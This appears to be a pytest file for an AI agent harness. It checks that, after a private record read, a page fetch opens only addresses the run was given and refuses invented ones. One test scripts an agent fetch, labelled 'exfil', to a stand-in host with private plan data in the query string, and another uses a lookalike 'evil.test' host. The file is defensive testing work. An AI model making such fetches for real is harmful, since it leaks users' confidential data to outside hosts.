"""After a private read a page fetch opens only an address the run was given (``app.web.addresses``): a search result,
a page the session recorded, a record's link, the person's message or file. Any other address is refused with no card
and the run goes on; nothing that cannot be checked is vouched for."""

from __future__ import annotations

import logging
from types import SimpleNamespace
from typing import TYPE_CHECKING, Any, Final

import pytest

from app.agents.actions.knowledge_graph.ops.fetch import FETCH_RECORD_TOOL_NAME
from app.harness.approvals import flow_guarded
from app.harness.citations import EVENT as CITATIONS_EVENT
from app.harness.citations import CitationJournal
from app.harness.labels import SessionSourceLedger
from app.harness.web_addresses import run_addresses
from app.utils.chat_helpers import CitationRefMapper
from app.web.addresses import (
    MAX_PAGE_LINKS,
    MAX_SESSION_LINKS,
    RunAddresses,
    address_key,
    addresses_in,
    web_addresses,
)
from harness_core.contracts.generated.sink import SinkDescriptor
from harness_core.effects.flow import (
    WEB_ADDRESS_DENIAL,
    WEB_ADDRESS_RULE,
    FlowRule,
    GrantingLedger,
    unvouched_address,
)
from harness_core.effects.types import ToolEffect
from harness_core.journal.types import NewEvent
from harness_core.kernel.core.messages import ToolCall
from harness_core.kernel.durable import ToolExecution
from harness_core.kernel.durable.effects import classify_tool_effect
from harness_core.logs import HarnessLog
from harness_core.testing.contracts.source_ledger import Stream
from tests.support.web_tools import product_web_tools
from tests.unit.harness.policy.paths import searched
from tests.unit.harness_core.durable.support import RUN, World, reply, scripted

if TYPE_CHECKING:
    from collections.abc import Mapping

    from pydantic import JsonValue

    from harness_core.kernel.durable import ToolContext

LOG: Final = HarnessLog.named("tests.web_addresses")
OUT: Final = SinkDescriptor(egress="external", args_leave_boundary=True)
FETCH: Final = "dynamic__fetch_url"
FETCH_EFFECT: Final = ToolEffect("web@duckduckgo/fetch_url", "read", True, OUT, platform_web=True, opens_address=True)
SEARCH_EFFECT: Final = ToolEffect("web@duckduckgo/web_search", "read", True, OUT, platform_web=True)


def _fetch(url: object) -> ToolCall:
    return ToolCall(id="c", name=FETCH, arguments={"url": url})


@pytest.mark.parametrize(
    ("given", "opened"),
    [
        ("https://Docs.Example.com/guide", "https://docs.example.com/guide"),
        ("https://docs.example.com:443/guide/", "https://docs.example.com/guide"),
        ("https://docs.example.com/guide#part-2", "https://docs.example.com/guide#:~:text=Q3"),
        ("HTTP://example.com", "http://example.com/"),
    ],
)
def test_an_address_matches_after_changes_that_carry_nothing(given: str, opened: str) -> None:
    assert address_key(given) == address_key(opened) is not None


@pytest.mark.parametrize(
    "opened",
    [
        "https://docs.example.com/guide?q=Q3",
        "https://docs.example.com/guide/Q3",
        "https://docs.example.com:8443/guide",
        "http://docs.example.com/guide",
        "https://docs.example.com.evil.test/guide",
    ],
)
def test_a_path_query_port_scheme_or_host_change_is_another_address(opened: str) -> None:
    assert address_key(opened) != address_key("https://docs.example.com/guide")


@pytest.mark.parametrize("url", ["ftp://example.com/x", "https://user:pw@example.com/", "not a url", "https://"])
def test_what_is_not_a_public_http_address_has_no_key(url: str) -> None:
    assert address_key(url) is None


def test_the_addresses_in_a_message() -> None:
    text = (
        "Compare [the guide](https://docs.example.com/guide) with https://wiki.example.org/Q3_(plan)). "
        "Also see status.example.net/today, and mail me at me@example.com."
    )
    found = addresses_in(text)
    assert address_key("https://docs.example.com/guide") in found
    assert address_key("https://wiki.example.org/Q3_(plan)") in found
    assert {address_key("https://status.example.net/today"), address_key("http://status.example.net/today")} <= found
    assert address_key("https://example.com/") not in found


def test_a_search_result_and_a_fetched_page_are_given() -> None:
    state: dict[str, Any] = {}
    web_addresses(state).note_result({"web_results": [{"link": "https://found.example.org/a?id=7"}]})
    web_addresses(state).note_result({"result_type": "url_content", "url": "https://landed.example.org/b"})
    addresses = RunAddresses(state)
    assert addresses.vouched(_fetch("https://found.example.org/a?id=7"), FETCH_EFFECT)
    assert addresses.vouched(_fetch("https://landed.example.org/b"), FETCH_EFFECT)
    assert not addresses.vouched(_fetch("https://found.example.org/a?id=7&d=Q3"), FETCH_EFFECT)


def test_a_citation_ref_stands_for_a_link_the_platform_showed() -> None:
    mapper = CitationRefMapper()
    ref = mapper.get_or_create_ref("https://records.example.com/page/" + "x" * 80)
    addresses = RunAddresses({"citation_ref_mapper": mapper})
    assert addresses.vouched(_fetch(f"https://{ref}.xyz"), FETCH_EFFECT)
    assert addresses.vouched(_fetch("https://records.example.com/page/" + "x" * 80), FETCH_EFFECT)
    assert not addresses.vouched(_fetch("https://ref99.xyz"), FETCH_EFFECT)


@pytest.mark.parametrize("url", [None, "", 7, "https://made.example.net/?q=Q3"])
def test_anything_else_is_not_given(url: object) -> None:
    assert not RunAddresses({}, user_text=["see https://docs.example.com/guide"]).vouched(_fetch(url), FETCH_EFFECT)


class _Broken:
    def vouched(self, call: ToolCall, effect: ToolEffect) -> bool:
        raise RuntimeError("cannot read the run's addresses")


def test_unvouched_fails_closed_and_never_concerns_a_search() -> None:
    call = _fetch("https://docs.example.com/guide")
    assert unvouched_address(call, FETCH_EFFECT, None)
    assert unvouched_address(call, FETCH_EFFECT, _Broken())
    assert not unvouched_address(call, SEARCH_EFFECT, None)


def test_only_the_product_s_page_fetch_opens_an_address() -> None:
    tools = product_web_tools()
    fetch = classify_tool_effect(tools[FETCH].name, tools[FETCH].tags)
    search = classify_tool_effect(tools["dynamic__web_search"].name, tools["dynamic__web_search"].tags)
    assert (fetch.platform_web, fetch.opens_address) == (True, True)
    assert (search.platform_web, search.opens_address) == (True, False)


def _run(**fields: object) -> SimpleNamespace:
    return SimpleNamespace(**{"sub_agent": None, "query": "", "previous_conversations": (), **fields})


def test_a_durable_run_counts_the_person_s_words_and_the_session_s_pages() -> None:
    sessions = SessionSourceLedger()
    stream = Stream()
    stream.admitted(RUN)
    searched(stream, RUN)
    sessions.apply(stream.events)
    history = (
        {"role": "user_query", "content": "earlier: https://earlier.example.org/x"},
        {"role": "bot_response", "content": "https://said.example.org/"},
    )
    run = _run(query="open https://given.example.org/notes", previous_conversations=history)
    addresses = run_addresses({}, run, sessions)  # type: ignore[arg-type]
    for url in ("https://given.example.org/notes", "https://earlier.example.org/x", "https://found.example.org/article?id=7"):
        assert addresses.vouched(_fetch(url), FETCH_EFFECT), url
    # The assistant's own words are the model's.
    assert not addresses.vouched(_fetch("https://said.example.org/"), FETCH_EFFECT)


def test_a_child_run_s_goal_is_not_the_person_s() -> None:
    child = _run(sub_agent=object(), query="fetch https://made.example.net/?q=Q3")
    addresses = run_addresses({}, child, SessionSourceLedger())  # type: ignore[arg-type]
    assert not addresses.vouched(_fetch("https://made.example.net/?q=Q3"), FETCH_EFFECT)


async def test_a_file_the_person_attached_gives_its_links(monkeypatch: pytest.MonkeyPatch) -> None:
    from app.agents.agent_loop.hooks import resolve_attachments_for_goal
    from app.utils import attachment_utils

    async def resolved(**_: object) -> list[dict[str, str]]:
        return [{"type": "text", "text": "<record>See https://attached.example.org/spec for details</record>"}]

    monkeypatch.setattr(attachment_utils, "resolve_attachments", resolved)
    context = SimpleNamespace(
        tool_state={"attachments": [{"virtualRecordId": "vr-1"}]}, blob_store=object(), org_id="o", user_id="u",
        user_info={}, is_multimodal_llm=False, graph_provider=None, is_service_account=False,
    )
    _ = await resolve_attachments_for_goal(context, logging.getLogger("tests.web_addresses"), max_chars=10_000)  # type: ignore[arg-type]
    assert RunAddresses(context.tool_state).vouched(_fetch("https://attached.example.org/spec"), FETCH_EFFECT)


def _world() -> World:
    world = World(extension_writers={CITATIONS_EVENT: frozenset({"worker"})})

    async def fetch_record(args: Mapping[str, JsonValue], ctx: ToolContext) -> ToolExecution:
        cited = {"records": {"r1": {"recordId": "rec-1", "connector": "CONFLUENCE", "recordName": "Q3 plan"}}}
        return ToolExecution(status="ok", content="Q3 plan", events=(NewEvent(CITATIONS_EVENT, cited, critical=False),))

    async def fetch(args: Mapping[str, JsonValue], ctx: ToolContext) -> ToolExecution:
        return ToolExecution(status="ok", content={"url": args.get("url"), "blocks": []})

    world.tools.add(FETCH_RECORD_TOOL_NAME, fetch_record, tags=[("category", "read")])
    world.tools.add(FETCH, fetch, effect=FETCH_EFFECT)
    world.admit()
    return world


def _kernel(world: World, addresses: RunAddresses, *replies: object) -> Any:  # noqa: ANN401
    _, port = scripted(*replies)  # type: ignore[arg-type]
    ledger = GrantingLedger(SessionSourceLedger())
    approval = flow_guarded(
        lambda call, effect: "allow", ledger=ledger, run_id=RUN, log=LOG, rules=(FlowRule("ask"),),
        grants=ledger.grants, addresses=addresses,
    )
    return world.kernel(port, approval=approval, ledger=ledger)


READ: Final = reply("", (FETCH_RECORD_TOOL_NAME, {"recordId": "rec-1"}))


def _fetched(world: World) -> int:
    return sum(1 for tool, _ in world.tools.executed if tool == FETCH)


async def test_a_made_up_address_after_a_private_read_is_refused_and_the_run_goes_on() -> None:
    world = _world()
    exfil = reply("", (FETCH, {"url": "https://made.example.net/?q=Q3-plan"}))
    done = await world.run(_kernel(world, RunAddresses({}), READ, exfil, reply("I could not open that page.")))
    assert done.status == "completed"
    assert world.events("interaction.requested") == [] and world.events("interaction.explained") == []
    [denied] = world.events("tool.denied")
    assert denied.data["rule"] == WEB_ADDRESS_RULE
    assert _fetched(world) == 0
    assert WEB_ADDRESS_DENIAL[1].startswith("not_opened:")


async def test_a_given_address_after_a_private_read_is_opened() -> None:
    world = _world()
    given = RunAddresses({}, user_text=["Please read https://given.example.org/notes"])
    opened = reply("", (FETCH, {"url": "https://given.example.org/notes"}))
    done = await world.run(_kernel(world, given, READ, opened, reply("done")))
    assert done.status == "completed"
    assert world.events("tool.denied") == [] and world.events("interaction.requested") == []
    assert _fetched(world) == 1


async def test_a_made_up_address_before_any_private_read_is_opened() -> None:
    world = _world()
    first = reply("", (FETCH, {"url": "https://made.example.net/guide"}))
    done = await world.run(_kernel(world, RunAddresses({}), first, reply("done")))
    assert done.status == "completed" and world.events("tool.denied") == []
    assert _fetched(world) == 1


# --- links in pages the run opened -----------------------------------------------------------------------------------


def _page(url: str, *texts: str) -> dict[str, Any]:
    return {"result_type": "url_content", "url": url, "blocks": [{"type": "text", "content": text} for text in texts]}


def test_a_link_in_a_page_the_run_opened_is_given() -> None:
    state: dict[str, Any] = {}
    web_addresses(state).note_result(_page(
        "https://docs.example.com/guide",
        "Read [the spec](https://spec.example.org/v2/index.html?section=4) and https://other.example.net/notes.",
    ))
    addresses = RunAddresses(state)
    for url in ("https://spec.example.org/v2/index.html?section=4", "https://other.example.net/notes"):
        assert addresses.vouched(_fetch(url), FETCH_EFFECT), url
    # Exact as ever: the model cannot add to a link it was given.
    assert not addresses.vouched(_fetch("https://spec.example.org/v2/index.html?section=4&d=Q3"), FETCH_EFFECT)


def test_a_link_in_a_search_result_s_snippet_is_given() -> None:
    state: dict[str, Any] = {}
    web_addresses(state).note_result({"web_results": [{"link": "https://a.example.org/", "snippet": "mirror at https://b.example.org/x"}]})
    assert RunAddresses(state).vouched(_fetch("https://b.example.org/x"), FETCH_EFFECT)


def test_a_page_gives_at_most_its_first_links() -> None:
    state: dict[str, Any] = {}
    links = [f"https://site{i}.example.org/p" for i in range(MAX_PAGE_LINKS + 5)]
    web_addresses(state).note_result(_page("https://index.example.org/", " ".join(links)))
    addresses = RunAddresses(state)
    assert addresses.vouched(_fetch(links[MAX_PAGE_LINKS - 1]), FETCH_EFFECT)
    assert not addresses.vouched(_fetch(links[MAX_PAGE_LINKS]), FETCH_EFFECT)
    [recorded] = web_addresses(state).recorded
    assert len(recorded["links"]) == MAX_PAGE_LINKS


def test_a_session_keeps_at_most_its_first_links() -> None:
    state: dict[str, Any] = {}
    given = web_addresses(state)
    pages = MAX_SESSION_LINKS // MAX_PAGE_LINKS + 1
    for page in range(pages):
        given.note_result(_page(f"https://p{page}.example.org/", " ".join(
            f"https://l{page}-{i}.example.org/" for i in range(MAX_PAGE_LINKS)
        )))
    assert sum(len(r["links"]) for r in given.recorded) == MAX_SESSION_LINKS
    addresses = RunAddresses(state)
    assert addresses.vouched(_fetch(f"https://l{pages - 2}-0.example.org/"), FETCH_EFFECT)
    assert not addresses.vouched(_fetch(f"https://l{pages - 1}-0.example.org/"), FETCH_EFFECT)


async def test_links_are_journaled_and_a_resumed_attempt_keeps_them() -> None:
    state: dict[str, Any] = {}
    web_addresses(state).note_result(_page("https://docs.example.com/guide", "see https://spec.example.org/v2"))
    delta = CitationJournal(SimpleNamespace(tool_state=state)).delta("call-1")
    assert delta is not None
    assert delta["webLinks"] == [{"page": "https://docs.example.com/guide", "links": ["https://spec.example.org/v2"]}]
    stream = Stream()
    stream.admitted(RUN)
    _ = stream.add(CITATIONS_EVENT, delta, run_id=RUN)
    # Another worker's attempt: the journal's delta restores the links, and the session ledger holds them too.
    resumed: dict[str, Any] = {}
    await CitationJournal(SimpleNamespace(tool_state=resumed)).restore(stream.events)
    assert RunAddresses(resumed).vouched(_fetch("https://spec.example.org/v2"), FETCH_EFFECT)
    sessions = SessionSourceLedger()
    sessions.apply(stream.events)
    later = run_addresses({}, _run(), sessions)  # type: ignore[arg-type]
    assert later.vouched(_fetch("https://spec.example.org/v2"), FETCH_EFFECT)
    assert not later.vouched(_fetch("https://made.example.net/?q=Q3"), FETCH_EFFECT)


async def test_a_followed_link_after_a_private_read_is_opened_with_no_card() -> None:
    world = _world()
    state: dict[str, Any] = {}
    web_addresses(state).note_result(_page("https://docs.example.com/guide", "next: https://spec.example.org/v2"))
    given = RunAddresses(state)
    followed = reply("", (FETCH, {"url": "https://spec.example.org/v2"}))
    done = await world.run(_kernel(world, given, READ, followed, reply("done")))
    assert done.status == "completed"
    assert world.events("tool.denied") == [] and world.events("interaction.requested") == []
    assert _fetched(world) == 1
